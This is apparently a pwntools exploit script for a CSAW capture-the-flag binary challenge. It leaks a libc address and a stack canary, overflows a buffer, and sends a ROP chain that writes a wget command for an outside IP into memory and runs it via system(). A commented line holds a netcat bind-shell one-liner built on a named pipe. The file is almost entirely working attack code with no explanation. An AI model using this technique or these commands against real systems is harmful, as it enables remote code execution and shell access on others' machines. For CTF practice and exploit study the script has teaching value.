from pwn import *
import struct
def main():
	"""	
	HOST = "192.168.56.101"
	PORT = 54348
	"""
	#"""
	HOST = "pwn.chal.csaw.io"
	PORT = 8002
	#"""
	#mkfifo /tmp/mypipe; cat /tmp/mypipe | /bin/bash 2>&1| nc -l 6000 >/tmp/mypipe	
	r = remote(HOST,PORT)
	payload = "A"*300
	for x in xrange(0,4):
		print r.recvline()
	r.sendline("1")
	reference =  r.recvline()
	libcadr = int(reference.split(":")[1].strip('\n'),0)-456800
	systemadr = libcadr+288144
	sleepadr = libcadr+789440
	print hex(libcadr)
	r.sendline("2")
	print r.recvline()	
	for x in xrange(0,4):
		print r.recvline()
	r.sendline(payload)
	#Spacing
	r.recvline()
	#Memory dump?
	memdump = r.recvline()
	memdump = memdump.rstrip("-Tutorial-\n")
	cookie =  struct.unpack("<Q",memdump[len(memdump)-12:len(memdump)-4])
	print hex(cookie[0])	
	for x in xrange(0,3):
		print r.recvline()
	cookie = struct.pack("<Q",cookie[0])
	dataloc = 0x00000000003be080
	p = ''
	'''sleep test
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', 0x500) #rdi = 0x500
	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax
	p += struct.pack('<Q', sleepadr) # rax = sleep
	p += struct.pack('<Q', libcadr+0x0001f835)
	'''
	
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+dataloc) # @ .data
	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
	p += 'wget \'ht'
	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += struct.pack('<Q', 0x4141414141414141) # padding
	p += struct.pack('<Q', 0x4141414141414141) # padding

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', libcadr+dataloc+8) # @ .data
	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
        p += 'tp://192'
        p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
        p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding
	
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', libcadr+dataloc+16) # @ .data
        p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
        p += '.210.231'
        p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
        p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', libcadr+dataloc+24) # @ .data
        p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
        p += '.110:123'
        p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
        p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', libcadr+dataloc+32) # @ .data
        p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
        p += '45/test\''
        p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
        p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q', libcadr+dataloc+40) # @ .data
        p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
        p += '\x00\x00\x00\x00\x00\x00\x00\x00'
        p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
        p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding


	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
        p += struct.pack('<Q',libcadr+dataloc+41) #@ .data+34
	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += struct.pack('<Q', 0x4141414141414141) # padding
        p += struct.pack('<Q', 0x4141414141414141) # padding

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data
	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax; ret
	p += struct.pack('<Q',systemadr) #load system
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+dataloc) # @ .data
	p += struct.pack('<Q', libcadr+0x0001f835) # call rax ; system(.data)
	
	"""
	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
	p += struct.pack('<Q', libcadr+0x00000000000c11df) # nop ; mov eax, 0x3b ; syscall
	p += struct.pack('<Q', libcadr+0x000000000000269f) # syscall	
	"""
	#Used to expand the space for the rop chain
	init = ''
	init += struct.pack('<Q',libcadr+0x00000000000bcdee) # xor eax, eax ; pop rdx ; ret
	init += struct.pack('<Q',0x500) #Rop chain size
	init += struct.pack('<Q', libcadr+0x000c1d05) # syscall;ret
	getsadr = struct.pack("<Q",libcadr+455536)
	payload = "A"*(300)+"B"*4+"C"*4+"D"*4+cookie+"E"*4+"F"*4+init
	r.sendline("2")
	for x in xrange(0,1):
		print r.recvline()
	r.sendline(payload)
	r.sendline("B"*len(payload)+p)	
	r.interactive()
	pass
main()
